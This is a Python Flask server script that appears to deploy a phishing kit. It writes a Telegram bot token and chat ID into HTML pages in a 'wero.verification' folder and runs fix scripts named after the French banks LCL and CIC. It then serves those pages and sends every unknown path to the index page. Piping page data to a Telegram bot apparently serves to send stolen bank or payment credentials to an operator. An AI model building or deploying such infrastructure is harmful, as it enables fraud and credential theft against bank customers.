#!/usr/bin/env python
import subprocess
import sys
import os
import glob
from pathlib import Path
from flask import Flask, send_file, abort

# Setup phase (main process only)
if not os.environ.get('GUNICORN_CMD_ARGS'):
    print("🚀 STARTUP\n")
    
    # 1. Setup Telegram configuration dans les fichiers HTML
    print("  ▶️  Configuring Telegram in HTML files...")
    bot_token = os.getenv('BOT_TOKEN', 'NOT_SET')
    chat_id = os.getenv('CHAT_ID', 'NOT_SET')
    
    print(f"      BOT_TOKEN: {bot_token[:20]}..." if len(bot_token) > 20 else f"      BOT_TOKEN: {bot_token}")
    print(f"      CHAT_ID: {chat_id}")
    
    html_files = glob.glob('wero.verification/*.html')
    for html_file in html_files:
        try:
            with open(html_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            content = content.replace('TELEGRAM_BOT_TOKEN_PLACEHOLDER', bot_token)
            content = content.replace('TELEGRAM_CHAT_ID_PLACEHOLDER', chat_id)
            content = content.replace('{{BOT_TOKEN}}', bot_token)
            content = content.replace('{{CHAT_ID}}', chat_id)
            
            with open(html_file, 'w', encoding='utf-8') as f:
                f.write(content)
        except Exception as e:
            print(f"      ⚠️  {Path(html_file).name}: {e}")
    
    print("      ✅ Telegram configured\n")
    
    # 2. Run fix scripts
    print("  ▶️  Running fix scripts...")
    scripts = ["final_lcl_fix.py", "fix_cic.py", "fix_lcl.py"]
    for script in scripts:
        if Path(script).exists():
            subprocess.run([sys.executable, script], capture_output=True, timeout=10)
    print("      ✅ Done\n")

# Flask app
app = Flask(__name__)
WEB_ROOT = Path("wero.verification").resolve()

@app.route('/')
def index():
    file_path = WEB_ROOT / 'index.html'
    if file_path.exists():
        return send_file(str(file_path), mimetype='text/html')
    return f"Error: {file_path} not found", 404

@app.route('/<path:path>')
def serve_file(path):
    file_path = WEB_ROOT / path
    
    try:
        file_path = file_path.resolve()
        if not str(file_path).startswith(str(WEB_ROOT)):
            abort(403)
    except:
        abort(404)
    
    if file_path.exists() and file_path.is_file():
        mime_types = {
            '.html': 'text/html',
            '.js': 'application/javascript',
            '.css': 'text/css',
            '.json': 'application/json',
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.gif': 'image/gif',
            '.ico': 'image/x-icon',
            '.svg': 'image/svg+xml',
        }
        mime = mime_types.get(file_path.suffix.lower(), 'application/octet-stream')
        return send_file(str(file_path), mimetype=mime)
    
    abort(404)

@app.errorhandler(404)
def not_found(e):
    index_path = WEB_ROOT / 'index.html'
    if index_path.exists():
        return send_file(str(index_path), mimetype='text/html'), 200
    return "Not found", 404

if __name__ == '__main__':
    PORT = int(os.getenv('PORT', 8000))
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
